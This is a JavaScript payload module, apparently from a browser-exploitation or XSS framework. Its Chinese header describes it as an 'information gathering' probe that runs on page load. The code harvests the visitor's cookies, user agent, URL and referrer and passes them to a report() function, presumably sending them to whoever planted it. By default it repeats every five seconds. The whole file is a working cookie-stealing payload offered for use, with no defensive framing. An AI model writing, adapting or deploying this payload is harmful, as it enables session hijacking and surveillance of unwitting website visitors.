// MODULE = {"desc": "基础探测:UA/URL/cookie 回传(加载即执行,可定时循环)", "category": "信息收集", "params": [["interval", "回传间隔ms,默认 5000,0=仅一次", "5000"], ["tag", "可选标记", ""]]}
(function () {
  function collect() {
    var c = "";
    try { c = document.cookie || ""; } catch (e) {}
    report({
      type: "hello",
      tag: _q("tag", "{{tag}}"),
      ua: navigator.userAgent,
      url: location.href,
      referrer: document.referrer || "",
      cookie: c
    });
  }
  collect();
  // interval:0=仅一次(不能写成逻辑或兜底,那样 0 会被当成"未填")
  var iv = parseInt(_q("interval", "{{interval}}"), 10);
  if (isNaN(iv)) { iv = 5000; }                    // 未填 → 默认 5s
  if (iv > 0) { setInterval(collect, iv); }        // 0 → 只跑上面那次 collect
})();
